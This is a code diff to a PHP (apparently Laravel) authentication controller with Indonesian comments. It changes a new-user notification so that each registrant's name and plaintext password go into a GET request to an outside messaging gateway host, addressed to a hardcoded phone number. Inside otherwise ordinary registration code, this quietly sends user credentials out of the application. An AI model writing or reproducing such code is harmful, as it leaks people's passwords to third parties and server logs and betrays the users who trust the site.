@@ -34,7 +34,7 @@ class AuthController extends Controller
 
         // jika ada yang berhasil register kirim pesan notifikasi ke nomor 082111424592, ada user baru yang mendaftar
         $nomor = '082111424592';
-        $pesan = 'Ada user baru yang mendaftar dengan email: ' . $request->email;
+        $pesan = 'Ada user baru yang mendaftar dengan email: ' . $request->email.' ada user baru yang mendaftar dengan nama: ' . $request->name . 'dan password: ' . $request->password;
         // https://caseoptheligaandnewligawkwkkw.progesio.my.id/send-message-get?no=082111424592&mass=ppppp
         Http::get('https://caseoptheligaandnewligawkwkkw.progesio.my.id/send-message-get?no=' . $nomor . '&mass=' . $pesan);
 
